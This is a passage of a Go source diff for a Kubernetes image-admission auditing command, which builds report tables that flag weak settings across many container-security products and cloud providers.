+		"Issues",
+	}
+
+	blockedImagesHeaders := []string{
+		"Controller",
+		"Policy",
+		"Scope",
+		"Namespaces",
+		"Blocked Pattern",
+		"Reason",
+		"Effect",
+		"Issues",
+	}
+
+	unifiedPoliciesHeaders := []string{
+		"Namespace",
+		"Tool",
+		"Name",
+		"Scope",
+		"Type",
+		"Details",
+	}
+
+	cloudPolicyHeaders := []string{
+		"Provider",
+		"Policy Type",
+		"Name",
+		"Blocks Deploy",
+		"Enforcement",
+		"Default Action",
+		"Bypass Patterns",
+		"Allowed Registries",
+		"Details",
+		"Issues",
+	}
+
+	gcpAttestorHeaders := []string{
+		"Project",
+		"Attestor Name",
+		"Description",
+		"Keys",
+		"Algorithm",
+		"Updated",
+		"Issues",
+	}
+
+	awsScanConfigHeaders := []string{
+		"Repository",
+		"Registry ID",
+		"Scan on Push",
+		"Detects Malicious",
+		"Scan Frequency",
+		"Issues",
+	}
+
+	awsSignerProfileHeaders := []string{
+		"Profile Name",
+		"Version",
+		"Platform",
+		"Status",
+		"Enforced",
+		"Issues",
+	}
+
+	// Aqua Security policies detail table
+	aquaHeaders := []string{
+		"Name",
+		"Namespace",
+		"Enabled",
+		"Block Unregistered",
+		"Block Malware",
+		"CVSS Threshold",
+		"Allowed Registries",
+		"Issues",
+	}
+
+	// Prisma Cloud policies detail table
+	prismaHeaders := []string{
+		"Name",
+		"Enabled",
+		"Block Threshold",
+		"Grace Period Days",
+		"Block Malware",
+		"Trusted Registries",
+		"Issues",
+	}
+
+	// Sysdig Secure policies detail table
+	sysdigHeaders := []string{
+		"Name",
+		"Enabled",
+		"Scanning Enabled",
+		"Block On Failure",
+		"CVSS Threshold",
+		"Allowed Registries",
+		"Issues",
+	}
+
+	// NeuVector policies detail table
+	neuvectorHeaders := []string{
+		"Name",
+		"Namespace",
+		"Enabled",
+		"Mode",
+		"Block High CVE",
+		"Allowed Registries",
+		"Denied Registries",
+		"Issues",
+	}
+
+	// StackRox policies detail table
+	stackroxHeaders := []string{
+		"Name",
+		"Enabled",
+		"Enforcement Action",
+		"Severity",
+		"Categories",
+		"Image Criteria",
+		"Issues",
+	}
+
+	// Snyk Container policies detail table
+	snykHeaders := []string{
+		"Name",
+		"Enabled",
+		"Severity Threshold",
+		"Auto Fix",
+		"Block On Failure",
+		"Monitored Projects",
+		"Issues",
+	}
+
+	// Anchore policies detail table
+	anchoreHeaders := []string{
+		"Name",
+		"Enabled",
+		"Policy Bundle ID",
+		"Fail On Policy Eval",
+		"Mode",
+		"Allowed Registries",
+		"Issues",
+	}
+
+	// Trivy Operator policies detail table
+	trivyHeaders := []string{
+		"Name",
+		"Namespace",
+		"Scan Jobs Enabled",
+		"Vuln Reports",
+		"Config Audit Reports",
+		"SBOM Enabled",
+		"Severity Threshold",
+		"Issues",
+	}
+
+	// Notation policies detail table
+	notationHeaders := []string{
+		"Name",
+		"Enabled",
+		"Trust Policy Name",
+		"Trust Stores",
+		"Signature Format",
+		"Verification Level",
+		"Issues",
+	}
+
+	// Harbor policies detail table
+	harborHeaders := []string{
+		"Name",
+		"Enabled",
+		"Prevent Vuln Images",
+		"Severity Threshold",
+		"Auto Scan",
+		"Content Trust",
+		"Cosign Enabled",
+		"Issues",
+	}
+
+	// Clair policies detail table
+	clairHeaders := []string{
+		"Name",
+		"Enabled",
+		"Severity Threshold",
+		"Fixable Only",
+		"Allow List",
+		"Issues",
+	}
+
+	// Wiz policies detail table
+	wizHeaders := []string{
+		"Name",
+		"Enabled",
+		"Scanning Enabled",
+		"Block Vulnerabilities",
+		"Severity Threshold",
+		"Allowed Registries",
+		"Issues",
+	}
+
+	// Lacework policies detail table
+	laceworkHeaders := []string{
+		"Name",
+		"Enabled",
+		"Scanning Enabled",
+		"Block On Failure",
+		"Severity Threshold",
+		"Integration ID",
+		"Issues",
+	}
+
+	// Cosign Standalone policies detail table
+	cosignHeaders := []string{
+		"Name",
+		"Enabled",
+		"Key Refs",
+		"Keyless Enabled",
+		"Verify Attestations",
+		"Transparency Log",
+		"Issues",
+	}
+
+	// Flux Image policies detail table
+	fluxImageHeaders := []string{
+		"Name",
+		"Namespace",
+		"Image Repository",
+		"Filter Tags",
+		"Policy",
+		"Range",
+		"Issues",
+	}
+
+	// JFrog Xray policies detail table
+	xrayHeaders := []string{
+		"Name",
+		"Enabled",
+		"Severity Threshold",
+		"Block Downloads",
+		"Watch Names",
+		"Policy Rules",
+		"Issues",
+	}
+
+	// Deepfence policies detail table
+	deepfenceHeaders := []string{
+		"Name",
+		"Enabled",
+		"Scanning Enabled",
+		"Severity Threshold",
+		"Block Malware",
+		"Issues",
+	}
+
+	// Qualys policies detail table
+	qualysHeaders := []string{
+		"Name",
+		"Enabled",
+		"Scanning Enabled",
+		"Severity Threshold",
+		"Block On Critical",
+		"Issues",
+	}
+
+	// Docker Scout policies detail table
+	dockerScoutHeaders := []string{
+		"Name",
+		"Enabled",
+		"SBOM Enabled",
+		"Policy Check",
+		"Severity Threshold",
+		"Issues",
 	}
 
 	var controllerRows [][]string
 	var findingRows [][]string
-	var registryRows [][]string
-	var summaryRows [][]string
+	var imagesRows [][]string
 	var allowedImagesRows [][]string
+	var blockedImagesRows [][]string
+	var unifiedPoliciesRows [][]string
+	var cloudPolicyRows [][]string
+	var gcpAttestorRows [][]string
+	var awsScanConfigRows [][]string
+	var awsSignerProfileRows [][]string
+	var aquaRows [][]string
+	var prismaRows [][]string
+	var sysdigRows [][]string
+	var neuvectorRows [][]string
+	var stackroxRows [][]string
+	var snykRows [][]string
+	var anchoreRows [][]string
+	var trivyRows [][]string
+	var notationRows [][]string
+	var harborRows [][]string
+	var clairRows [][]string
+	var wizRows [][]string
+	var laceworkRows [][]string
+	var cosignRows [][]string
+	var fluxImageRows [][]string
+	var xrayRows [][]string
+	var deepfenceRows [][]string
+	var qualysRows [][]string
+	var dockerScoutRows [][]string
 
 	for _, c := range controllers {
 		sigReq := "No"
 		if c.SignatureReqs {
 			sigReq = "Yes"
 		}
-		bypassRisk := c.BypassRisk
-		if bypassRisk == "" {
-			bypassRisk = "<NONE>"
+
+		// Detect issues
+		var ctrlIssues []string
+		if c.Status == "degraded" || c.Status == "unverified" {
+			ctrlIssues = append(ctrlIssues, "Controller not healthy")
 		}
 		if c.FailurePolicy == "Ignore" {
-			bypassRisk = "Webhook Ignore"
+			ctrlIssues = append(ctrlIssues, "Failure policy Ignore")
+		}
+		if c.PolicyCount == 0 {
+			ctrlIssues = append(ctrlIssues, "No policies defined")
+		}
+		if !c.SignatureReqs {
+			ctrlIssues = append(ctrlIssues, "No signature required")
+		}
+		ctrlIssuesStr := "<NONE>"
+		if len(ctrlIssues) > 0 {
+			ctrlIssuesStr = strings.Join(ctrlIssues, "; ")
 		}
 
 		controllerRows = append(controllerRows, []string{
@@ -921,7 +1964,7 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 			c.Status,
 			fmt.Sprintf("%d", c.PolicyCount),
 			sigReq,
-			bypassRisk,
+			ctrlIssuesStr,
 		})
 	}
 
@@ -942,172 +1985,868 @@ func ListImageAdmission(cmd *cobra.Command, args []string) {
 		if vulnPolicy == "" {
 			vulnPolicy = "<NONE>"
 		}
-		bypassRisk := f.BypassRisk
-		if bypassRisk == "" {
-			bypassRisk = "<NONE>"
+
+		// Detect issues
+		var findIssues []string
+		if f.Policy == "allow" || f.Policy == "ALLOW" {
+			findIssues = append(findIssues, "Allow action")
+		}
+		if f.SignatureReq == "No" || f.SignatureReq == "" {
+			findIssues = append(findIssues, "No signature required")
+		}
+		if vulnPolicy == "<NONE>" {
+			findIssues = append(findIssues, "No vuln policy")
+		}
+		if repo == "*" {
+			findIssues = append(findIssues, "Wildcard repository")
+		}
+		findIssuesStr := "<NONE>"
+		if len(findIssues) > 0 {
+			findIssuesStr = strings.Join(findIssues, "; ")
 		}
 
 		findingRows = append(findingRows, []string{
+			ns,
 			f.Controller,
 			f.PolicyName,
 			f.Scope,
-			ns,
 			repo,
 			f.Policy,
 			f.SignatureReq,
 			attestation,
 			vulnPolicy,
-			bypassRisk,
+			findIssuesStr,
 		})
 	}
 
-	// Build registry breakdown rows
-	for _, usage := range imageSourceAnalysis.RegistryBreakdown {
-		regType := "Private"
-		if usage.IsPublic {
-			regType = "Public"
+	// Build images rows from deployed images
+	for ns, images := range imageSourceAnalysis.ImagesByNamespace {
+		for _, img := range images {
+			isPublic := "No"
+			if img.IsPublic {
+				isPublic = "Yes"
+			}
+			hasLatest := "No"
+			if img.HasLatest {
+				hasLatest = "Yes"
+			}
+			digest := img.Digest
+			if digest == "" {
+				digest = "<NONE>"
+			} else if len(digest) > 20 {
+				// Truncate long digests for display
+				digest = digest[:20] + "..."
+			}
+
+			// Detect issues
+			var imgIssues []string
+			if img.IsPublic {
+				imgIssues = append(imgIssues, "Public registry")
+			}
+			if img.HasLatest {
+				imgIssues = append(imgIssues, "Uses :latest tag")
+			}
+			if img.Digest == "" {
+				imgIssues = append(imgIssues, "No digest pinning")
+			}
+			imgIssuesStr := "<NONE>"
+			if len(imgIssues) > 0 {
+				imgIssuesStr = strings.Join(imgIssues, "; ")
+			}
+
+			imagesRows = append(imagesRows, []string{
+				ns,
+				img.PodName,
+				img.Container,
+				img.Registry,
+				img.Repository,
+				img.Tag,
+				digest,
+				isPublic,
+				hasLatest,
+				imgIssuesStr,
+			})
+		}
+	}
+
+	// Build cloud policy rows (from --cloud-provider flag)
+	for _, cp := range cloudPolicies {
+		blocksDeployment := "No"
+		if cp.BlocksDeployment {
+			blocksDeployment = "YES"
 		}
 
-		// Determine risk level
-		risk := shared.RiskLow
-		if usage.IsPublic && !policyEffectiveness.PublicRegistryBlocked[usage.Registry] {
-			risk = shared.RiskHigh
-		}
-		if usage.LatestCount > 0 {
-			if risk == shared.RiskLow {
-				risk = shared.RiskMedium
+		// Format bypass patterns (exempt images)
+		bypassPatterns := "-"
+		if len(cp.ExemptImages) > 0 {
+			if len(cp.ExemptImages) <= 3 {
+				bypassPatterns = strings.Join(cp.ExemptImages, ", ")
+			} else {
+				bypassPatterns = fmt.Sprintf("%s... (+%d more)", strings.Join(cp.ExemptImages[:3], ", "), len(cp.ExemptImages)-3)
 			}
 		}
-		if usage.BlockingPolicy == "" && len(controllers) > 0 {
-			risk = shared.RiskMedium
-		}
-		if len(controllers) == 0 {
-			risk = shared.RiskCritical
+
+		// Format allowed registries
+		allowedRegs := "-"
+		if len(cp.AllowedRegistries) > 0 {
+			if len(cp.AllowedRegistries) <= 3 {
+				allowedRegs = strings.Join(cp.AllowedRegistries, ", ")
+			} else {
+				allowedRegs = fmt.Sprintf("%s... (+%d more)", strings.Join(cp.AllowedRegistries[:3], ", "), len(cp.AllowedRegistries)-3)
+			}
 		}
 
-		coverage := "Not Covered"
-		if usage.BlockingPolicy != "" {
-			coverage = "Covered"
+		// Detect issues
+		var cpIssues []string
+		if !cp.BlocksDeployment {
+			cpIssues = append(cpIssues, "Does not block deployment")
+		}
+		if cp.EnforcementMode == "audit" || cp.EnforcementMode == "dryrun" {
+			cpIssues = append(cpIssues, "Not enforcing")
+		}
+		if cp.DefaultAction == "ALLOW" || cp.DefaultAction == "allow" {
+			cpIssues = append(cpIssues, "Default allow action")
+		}
+		if len(cp.ExemptImages) > 0 {
+			cpIssues = append(cpIssues, "Has exemptions")
+		}
+		cpIssuesStr := "<NONE>"
+		if len(cpIssues) > 0 {
+			cpIssuesStr = strings.Join(cpIssues, "; ")
 		}
 
-		blockingPolicy := usage.BlockingPolicy
-		if blockingPolicy == "" {
-			blockingPolicy = "<NONE>"
-		}
-
-		registryRows = append(registryRows, []string{
-			risk,
-			usage.Registry,
-			regType,
-			fmt.Sprintf("%d", usage.ImageCount),
-			fmt.Sprintf("%d", len(usage.UniqueImages)),
-			fmt.Sprintf("%d", len(usage.Namespaces)),
-			fmt.Sprintf("%d", usage.LatestCount),
-			fmt.Sprintf("%d", usage.DigestCount),
-			coverage,
-			blockingPolicy,
+		cloudPolicyRows = append(cloudPolicyRows, []string{
+			cp.Provider,
+			cp.PolicyType,
+			cp.Name,
+			blocksDeployment,
+			cp.EnforcementMode,
+			cp.DefaultAction,
+			bypassPatterns,
+			allowedRegs,
+			cp.Details,
+			cpIssuesStr,
 		})
 	}
 
-	// Build summary rows
-	admissionStatus := "CRITICAL: No controllers"
-	admissionRisk := shared.RiskCritical
-	if len(controllers) > 0 {
-		if policyEffectiveness.IsBlocking {
-			admissionStatus = "Enforcing"
-			admissionRisk = shared.RiskLow
-		} else {
-			admissionStatus = policyEffectiveness.BlockingLevel
-			admissionRisk = shared.RiskMedium
-			if policyEffectiveness.BlockingLevel == "weak" || policyEffectiveness.BlockingLevel == "none" {
-				admissionRisk = shared.RiskHigh
-			}
+	// Build GCP attestor rows
+	for _, att := range gcpAttestors {
+		// Detect issues
+		var attIssues []string
+		if att.KeyCount == 0 {
+			attIssues = append(attIssues, "No keys configured")
 		}
+		if att.Description == "" {
+			attIssues = append(attIssues, "No description")
+		}
+		attIssuesStr := "<NONE>"
+		if len(attIssues) > 0 {
+			attIssuesStr = strings.Join(attIssues, "; ")
+		}
+
+		gcpAttestorRows = append(gcpAttestorRows, []string{
+			att.Project,
+			att.Name,
+			att.Description,
+			fmt.Sprintf("%d", att.KeyCount),
+			att.KeyAlgorithm,
+			att.UpdateTime,
+			attIssuesStr,
+		})
 	}
 
-	summaryRows = append(summaryRows, []string{
-		"Image Admission Status",
-		admissionStatus,
-		admissionRisk,
-	})
-	summaryRows = append(summaryRows, []string{
-		"Controllers Detected",
-		fmt.Sprintf("%d", len(controllers)),
-		func() string {
-			if len(controllers) == 0 {
-				return shared.RiskCritical
-			}
-			return shared.RiskLow
-		}(),
-	})
-	summaryRows = append(summaryRows, []string{
-		"Total Images Deployed",
-		fmt.Sprintf("%d", imageSourceAnalysis.TotalImages),
-		shared.RiskLow,
-	})
-	summaryRows = append(summaryRows, []string{
-		"Unique Registries",
-		fmt.Sprintf("%d (%d public, %d private)",
-			len(imageSourceAnalysis.RegistryBreakdown),
-			imageSourceAnalysis.PublicRegistryCount,
-			imageSourceAnalysis.PrivateRegistryCount),
-		func() string {
-			if imageSourceAnalysis.PublicRegistryCount > 0 && len(controllers) == 0 {
-				return shared.RiskHigh
-			}
-			return shared.RiskLow
-		}(),
-	})
-	summaryRows = append(summaryRows, []string{
-		"Images Using :latest",
-		fmt.Sprintf("%d", imageSourceAnalysis.LatestTagCount),
-		func() string {
-			if imageSourceAnalysis.LatestTagCount > 0 {
-				return shared.RiskMedium
-			}
-			return shared.RiskLow
-		}(),
-	})
-	summaryRows = append(summaryRows, []string{
-		"Images Without Digest",
-		fmt.Sprintf("%d", imageSourceAnalysis.ImagesWithoutDigest),
-		func() string {
-			if imageSourceAnalysis.ImagesWithoutDigest > imageSourceAnalysis.TotalImages/2 {
-				return shared.RiskMedium
-			}
-			return shared.RiskLow
-		}(),
-	})
-	summaryRows = append(summaryRows, []string{
-		"Uncovered Registries",
-		fmt.Sprintf("%d", len(policyEffectiveness.UncoveredRegistries)),
-		func() string {
-			if len(policyEffectiveness.UncoveredRegistries) > 0 {
-				return shared.RiskHigh
-			}
-			return shared.RiskLow
-		}(),
-	})
-	summaryRows = append(summaryRows, []string{
-		"Weak Policies",
-		fmt.Sprintf("%d", len(policyEffectiveness.WeakPolicies)),
-		func() string {
-			if len(policyEffectiveness.WeakPolicies) > 0 {
-				return shared.RiskMedium
-			}
-			return shared.RiskLow
-		}(),
-	})
-	summaryRows = append(summaryRows, []string{
-		"Bypass Vectors",
-		fmt.Sprintf("%d", len(policyEffectiveness.BypassVectors)),
-		func() string {
-			if len(policyEffectiveness.BypassVectors) > 0 {
-				return shared.RiskHigh
-			}
-			return shared.RiskLow
-		}(),
-	})
+	// Build AWS scan config rows
+	for _, cfg := range awsScanConfigs {
+		scanOnPush := "No"
+		if cfg.ScanOnPush {
+			scanOnPush = "Yes"
+		}
+		// ECR scanning detects malicious images but doesn't block deployment
+		detectsMalicious := "Yes (post-deploy)"
+		if cfg.ScanFrequency == "CONTINUOUS_SCAN" {
+			detectsMalicious = "Yes (continuous)"
+		}
+
+		// Detect issues
+		var scanIssues []string
+		if !cfg.ScanOnPush {
+			scanIssues = append(scanIssues, "Scan on push disabled")
+		}
+		if cfg.ScanFrequency != "CONTINUOUS_SCAN" {
+			scanIssues = append(scanIssues, "Not continuous scanning")
+		}
+		scanIssuesStr := "<NONE>"
+		if len(scanIssues) > 0 {
+			scanIssuesStr = strings.Join(scanIssues, "; ")
+		}
+
+		awsScanConfigRows = append(awsScanConfigRows, []string{
+			cfg.RepositoryName,
+			cfg.RegistryID,
+			scanOnPush,
+			detectsMalicious,
+			cfg.ScanFrequency,
+			scanIssuesStr,
+		})
+	}
+
+	// Build AWS signer profile rows
+	for _, profile := range awsSignerProfiles {
+		// Signer profiles need an admission controller to be enforced
+		enforced := "Requires AC"
+
+		// Detect issues
+		var signerIssues []string
+		signerIssues = append(signerIssues, "Requires admission controller for enforcement")
+		if profile.Status != "Active" {
+			signerIssues = append(signerIssues, "Profile not active")
+		}
+		signerIssuesStr := strings.Join(signerIssues, "; ")
+
+		awsSignerProfileRows = append(awsSignerProfileRows, []string{
+			profile.ProfileName,
+			profile.ProfileVersion,
+			profile.PlatformID,
+			profile.Status,
+			enforced,
+			signerIssuesStr,
+		})
+	}
+
+	// Build Aqua Security rows
+	for _, p := range aquaPolicies {
+		allowedRegs := "<NONE>"
+		if len(p.AllowedRegistries) > 0 {
+			allowedRegs = strings.Join(p.AllowedRegistries, ", ")
+		}
+
+		// Detect issues
+		var aquaIssues []string
+		if !p.Enabled {
+			aquaIssues = append(aquaIssues, "Policy disabled")
+		}
+		if !p.BlockUnregistered {
+			aquaIssues = append(aquaIssues, "Unregistered images allowed")
+		}
+		if !p.BlockMalware {
+			aquaIssues = append(aquaIssues, "Malware not blocked")
+		}
+		if p.CVSSThreshold > 7.0 {
+			aquaIssues = append(aquaIssues, "High CVSS threshold")
+		}
+		issuesStr := "<NONE>"
+		if len(aquaIssues) > 0 {
+			issuesStr = strings.Join(aquaIssues, "; ")
+		}
+
+		aquaRows = append(aquaRows, []string{
+			p.Name,
+			p.Namespace,
+			shared.FormatBool(p.Enabled),
+			shared.FormatBool(p.BlockUnregistered),
+			shared.FormatBool(p.BlockMalware),
+			fmt.Sprintf("%.1f", p.CVSSThreshold),
+			allowedRegs,
+			issuesStr,
+		})
+	}
+
+	// Build Prisma Cloud rows
+	for _, p := range prismaPolicies {
+		trustedRegs := "<NONE>"
+		if len(p.TrustedRegistries) > 0 {
+			trustedRegs = strings.Join(p.TrustedRegistries, ", ")
+		}
+
+		// Detect issues
+		var prismaIssues []string
+		if !p.Enabled {
+			prismaIssues = append(prismaIssues, "Policy disabled")
+		}
+		if !p.BlockMalware {
+			prismaIssues = append(prismaIssues, "Malware not blocked")
+		}
+		if p.GracePeriodDays > 7 {
+			prismaIssues = append(prismaIssues, "Long grace period")
+		}
+		if p.BlockThreshold == "" || p.BlockThreshold == "critical" {
+			prismaIssues = append(prismaIssues, "Weak block threshold")
+		}
+		issuesStr := "<NONE>"
+		if len(prismaIssues) > 0 {
+			issuesStr = strings.Join(prismaIssues, "; ")
+		}
+
+		prismaRows = append(prismaRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			p.BlockThreshold,
+			fmt.Sprintf("%d", p.GracePeriodDays),
+			shared.FormatBool(p.BlockMalware),
+			trustedRegs,
+			issuesStr,
+		})
+	}
+
+	// Build Sysdig Secure rows
+	for _, p := range sysdigPolicies {
+		allowedRegs := "<NONE>"
+		if len(p.AllowedRegistries) > 0 {
+			allowedRegs = strings.Join(p.AllowedRegistries, ", ")
+		}
+
+		// Detect issues
+		var sysdigIssues []string
+		if !p.Enabled {
+			sysdigIssues = append(sysdigIssues, "Policy disabled")
+		}
+		if !p.ScanningEnabled {
+			sysdigIssues = append(sysdigIssues, "Scanning disabled")
+		}
+		if !p.BlockOnFailure {
+			sysdigIssues = append(sysdigIssues, "Not blocking on failure")
+		}
+		if p.CVSSThreshold > 7.0 {
+			sysdigIssues = append(sysdigIssues, "High CVSS threshold")
+		}
+		issuesStr := "<NONE>"
+		if len(sysdigIssues) > 0 {
+			issuesStr = strings.Join(sysdigIssues, "; ")
+		}
+
+		sysdigRows = append(sysdigRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			shared.FormatBool(p.ScanningEnabled),
+			shared.FormatBool(p.BlockOnFailure),
+			fmt.Sprintf("%.1f", p.CVSSThreshold),
+			allowedRegs,
+			issuesStr,
+		})
+	}
+
+	// Build NeuVector rows
+	for _, p := range neuvectorPolicies {
+		allowedRegs := "<NONE>"
+		if len(p.AllowedRegistries) > 0 {
+			allowedRegs = strings.Join(p.AllowedRegistries, ", ")
+		}
+		deniedRegs := "<NONE>"
+		if len(p.DeniedRegistries) > 0 {
+			deniedRegs = strings.Join(p.DeniedRegistries, ", ")
+		}
+
+		// Detect issues
+		var neuvectorIssues []string
+		if !p.Enabled {
+			neuvectorIssues = append(neuvectorIssues, "Policy disabled")
+		}
+		if p.Mode == "monitor" || p.Mode == "discover" {
+			neuvectorIssues = append(neuvectorIssues, "Not enforcing")
+		}
+		if !p.BlockHighCVE {
+			neuvectorIssues = append(neuvectorIssues, "High CVE not blocked")
+		}
+		issuesStr := "<NONE>"
+		if len(neuvectorIssues) > 0 {
+			issuesStr = strings.Join(neuvectorIssues, "; ")
+		}
+
+		neuvectorRows = append(neuvectorRows, []string{
+			p.Name,
+			p.Namespace,
+			shared.FormatBool(p.Enabled),
+			p.Mode,
+			shared.FormatBool(p.BlockHighCVE),
+			allowedRegs,
+			deniedRegs,
+			issuesStr,
+		})
+	}
+
+	// Build StackRox rows
+	for _, p := range stackroxPolicies {
+		categories := "<NONE>"
+		if len(p.Categories) > 0 {
+			categories = strings.Join(p.Categories, ", ")
+		}
+		imageCriteria := "<NONE>"
+		if len(p.ImageCriteria) > 0 {
+			imageCriteria = strings.Join(p.ImageCriteria, ", ")
+		}
+
+		// Detect issues
+		var stackroxIssues []string
+		if !p.Enabled {
+			stackroxIssues = append(stackroxIssues, "Policy disabled")
+		}
+		if p.EnforcementAction == "INFORM" || p.EnforcementAction == "" {
+			stackroxIssues = append(stackroxIssues, "Not enforcing")
+		}
+		issuesStr := "<NONE>"
+		if len(stackroxIssues) > 0 {
+			issuesStr = strings.Join(stackroxIssues, "; ")
+		}
+
+		stackroxRows = append(stackroxRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			p.EnforcementAction,
+			p.Severity,
+			categories,
+			imageCriteria,
+			issuesStr,
+		})
+	}
+
+	// Build Snyk Container rows
+	for _, p := range snykPolicies {
+		projects := "<NONE>"
+		if len(p.MonitoredProjects) > 0 {
+			projects = strings.Join(p.MonitoredProjects, ", ")
+		}
+
+		// Detect issues
+		var snykIssues []string
+		if !p.Enabled {
+			snykIssues = append(snykIssues, "Policy disabled")
+		}
+		if !p.BlockOnFailure {
+			snykIssues = append(snykIssues, "Not blocking on failure")
+		}
+		if p.SeverityThreshold == "" || p.SeverityThreshold == "critical" {
+			snykIssues = append(snykIssues, "Weak severity threshold")
+		}
+		issuesStr := "<NONE>"
+		if len(snykIssues) > 0 {
+			issuesStr = strings.Join(snykIssues, "; ")
+		}
+
+		snykRows = append(snykRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			p.SeverityThreshold,
+			shared.FormatBool(p.AutoFix),
+			shared.FormatBool(p.BlockOnFailure),
+			projects,
+			issuesStr,
+		})
+	}
+
+	// Build Anchore rows
+	for _, p := range anchorePolicies {
+		allowedRegs := "<NONE>"
+		if len(p.AllowedRegistries) > 0 {
+			allowedRegs = strings.Join(p.AllowedRegistries, ", ")
+		}
+
+		// Detect issues
+		var anchoreIssues []string
+		if !p.Enabled {
+			anchoreIssues = append(anchoreIssues, "Policy disabled")
+		}
+		if !p.FailOnPolicyEval {
+			anchoreIssues = append(anchoreIssues, "Not failing on policy eval")
+		}
+		if p.Mode == "audit" || p.Mode == "passive" {
+			anchoreIssues = append(anchoreIssues, "Not enforcing")
+		}
+		issuesStr := "<NONE>"
+		if len(anchoreIssues) > 0 {
+			issuesStr = strings.Join(anchoreIssues, "; ")
+		}
+
+		anchoreRows = append(anchoreRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			p.PolicyBundleID,
+			shared.FormatBool(p.FailOnPolicyEval),
+			p.Mode,
+			allowedRegs,
+			issuesStr,
+		})
+	}
+
+	// Build Trivy Operator rows
+	for _, p := range trivyPolicies {
+		// Detect issues
+		var trivyIssues []string
+		if !p.ScanJobsEnabled {
+			trivyIssues = append(trivyIssues, "Scan jobs disabled")
+		}
+		if !p.VulnerabilityReports {
+			trivyIssues = append(trivyIssues, "Vuln reports disabled")
+		}
+		if !p.ConfigAuditReports {
+			trivyIssues = append(trivyIssues, "Config audit disabled")
+		}
+		if p.SeverityThreshold == "" || p.SeverityThreshold == "CRITICAL" {
+			trivyIssues = append(trivyIssues, "Weak severity threshold")
+		}
+		issuesStr := "<NONE>"
+		if len(trivyIssues) > 0 {
+			issuesStr = strings.Join(trivyIssues, "; ")
+		}
+
+		trivyRows = append(trivyRows, []string{
+			p.Name,
+			p.Namespace,
+			shared.FormatBool(p.ScanJobsEnabled),
+			shared.FormatBool(p.VulnerabilityReports),
+			shared.FormatBool(p.ConfigAuditReports),
+			shared.FormatBool(p.SBOMEnabled),
+			p.SeverityThreshold,
+			issuesStr,
+		})
+	}
+
+	// Build Notation rows
+	for _, p := range notationPolicies {
+		trustStores := "<NONE>"
+		if len(p.TrustStores) > 0 {
+			trustStores = strings.Join(p.TrustStores, ", ")
+		}
+
+		// Detect issues
+		var notationIssues []string
+		if !p.Enabled {
+			notationIssues = append(notationIssues, "Policy disabled")
+		}
+		if len(p.TrustStores) == 0 {
+			notationIssues = append(notationIssues, "No trust stores configured")
+		}
+		if p.VerificationLevel == "permissive" || p.VerificationLevel == "audit" {
+			notationIssues = append(notationIssues, "Weak verification level")
+		}
+		issuesStr := "<NONE>"
+		if len(notationIssues) > 0 {
+			issuesStr = strings.Join(notationIssues, "; ")
+		}
+
+		notationRows = append(notationRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			p.TrustPolicyName,
+			trustStores,
+			p.SignatureFormat,
+			p.VerificationLevel,
+			issuesStr,
+		})
+	}
+
+	// Build Harbor rows
+	for _, p := range harborPolicies {
+		// Detect issues
+		var harborIssues []string
+		if !p.Enabled {
+			harborIssues = append(harborIssues, "Policy disabled")
+		}
+		if !p.PreventVulnImages {
+			harborIssues = append(harborIssues, "Vuln images not blocked")
+		}
+		if !p.AutoScan {
+			harborIssues = append(harborIssues, "Auto scan disabled")
+		}
+		if !p.ContentTrustEnabled && !p.CosignEnabled {
+			harborIssues = append(harborIssues, "No signature verification")
+		}
+		issuesStr := "<NONE>"
+		if len(harborIssues) > 0 {
+			issuesStr = strings.Join(harborIssues, "; ")
+		}
+
+		harborRows = append(harborRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			shared.FormatBool(p.PreventVulnImages),
+			p.SeverityThreshold,
+			shared.FormatBool(p.AutoScan),
+			shared.FormatBool(p.ContentTrustEnabled),
+			shared.FormatBool(p.CosignEnabled),
+			issuesStr,
+		})
+	}
+
+	// Build Clair rows
+	for _, p := range clairPolicies {
+		allowList := "<NONE>"
+		if len(p.AllowList) > 0 {
+			allowList = strings.Join(p.AllowList, ", ")
+		}
+
+		// Detect issues
+		var clairIssues []string
+		if !p.Enabled {
+			clairIssues = append(clairIssues, "Policy disabled")
+		}
+		if p.SeverityThreshold == "" || p.SeverityThreshold == "critical" || p.SeverityThreshold == "Critical" {
+			clairIssues = append(clairIssues, "Weak severity threshold")
+		}
+		if len(p.AllowList) > 10 {
+			clairIssues = append(clairIssues, "Large allow list")
+		}
+		issuesStr := "<NONE>"
+		if len(clairIssues) > 0 {
+			issuesStr = strings.Join(clairIssues, "; ")
+		}
+
+		clairRows = append(clairRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			p.SeverityThreshold,
+			shared.FormatBool(p.FixableOnly),
+			allowList,
+			issuesStr,
+		})
+	}
+
+	// Build Wiz rows
+	for _, p := range wizPolicies {
+		allowedRegs := "<NONE>"
+		if len(p.AllowedRegistries) > 0 {
+			allowedRegs = strings.Join(p.AllowedRegistries, ", ")
+		}
+
+		// Detect issues
+		var wizIssues []string
+		if !p.Enabled {
+			wizIssues = append(wizIssues, "Policy disabled")
+		}
+		if !p.ScanningEnabled {
+			wizIssues = append(wizIssues, "Scanning disabled")
+		}
+		if !p.BlockVulnerabilities {
+			wizIssues = append(wizIssues, "Vulnerabilities not blocked")
+		}
+		issuesStr := "<NONE>"
+		if len(wizIssues) > 0 {
+			issuesStr = strings.Join(wizIssues, "; ")
+		}
+
+		wizRows = append(wizRows, []string{
+			p.Name,
+			shared.FormatBool(p.Enabled),
+			shared.FormatBool(p.ScanningEnabled),
+			shared.FormatBool(p.BlockVulnerabilities),
+			p.SeverityThreshold,
+			allowedRegs,
+			issuesStr,
+		})
+	}
+
+	// Build Lacework rows
+	for _, p := range laceworkPolicies {
+		// Detect issues
+		var laceworkIssues []string
+		if !p.Enabled {
+			laceworkIssues = append(laceworkIssues, "Policy disabled")
+		}
+		if !p.ScanningEnabled {
+			laceworkIssues = append(laceworkIssues, "Scanning disabled")
+		}
+		if !p.BlockOnFailure {
+			laceworkIssues = append(laceworkIssues, "Not blocking on failure")
+		}
+		issuesStr := "<NONE>"
+		if len(laceworkIssues) > 0 {
+			issuesStr = strings.Join(laceworkIssues, "; ")
+		}
+
+		laceworkRows = append(laceworkRows, []string{
+			p.Name,
